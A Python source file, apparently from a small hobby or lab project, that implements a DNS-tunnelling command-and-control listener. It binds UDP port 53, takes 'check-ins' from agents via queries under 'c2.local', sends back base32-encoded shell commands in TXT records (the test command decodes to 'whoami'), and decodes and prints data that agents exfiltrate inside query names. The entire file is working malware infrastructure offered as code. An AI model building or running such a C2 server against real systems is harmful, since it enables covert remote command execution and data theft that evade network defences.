import socket
import dns.message as dm
import dns.rrset  # Importante para criar o registro TXT
from common.protocolo import DNSprotocolo
import base64

class DNSlistener:
    def __init__(self, ip='127.0.0.1', port=53):
        self.ip = ip
        self.port = port

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as self.s:
            self.s.bind((self.ip, self.port))
            print(f'[*] escutando na porta {self.port} \n')

            while True:
                pacote, endereco = self.s.recvfrom(1024)
                self.handlePacket(pacote, endereco, self.s)

    def handlePacket(self, dadosBrutos, endereco, socket_rede):
        try:
            pacote = dm.from_wire(dadosBrutos)
            urlBruta = pacote.question[0].name.to_text()
            tipo, mensagem = DNSprotocolo.limparUrl(urlBruta, 'c2.local')

            if tipo == '1':
                self.verificarFila()
                comando_teste_b32 = "O5UG6YLNNE"
                self.responde(pacote, socket_rede, endereco, comando_teste_b32)

            else:
                print(DNSprotocolo.traduzir(mensagem).decode('utf-8'))
                self.responde(pacote, socket_rede, endereco)
            
        except Exception as e:
            print(f"[-] Erro ao processar: {e}")

    def responde(self, pacote, socket_rede, endereco, comando_b32=None):
        resposta = dm.make_response(pacote)
        
        if comando_b32:
            rrset = dns.rrset.from_text(pacote.question[0].name, 300, 'IN', 'TXT', f'"{comando_b32}"')
            resposta.answer.append(rrset)
            print(f"[+] Resposta enviada com o comando: {comando_b32}")

        dadosResposta = resposta.to_wire()
        socket_rede.sendto(dadosResposta, endereco)

    def verificarFila(self):
        print('[*] Agente deu check-in. Verificando fila de comandos...')

if __name__ == '__main__':
    listener = DNSlistener()
    listener.start()
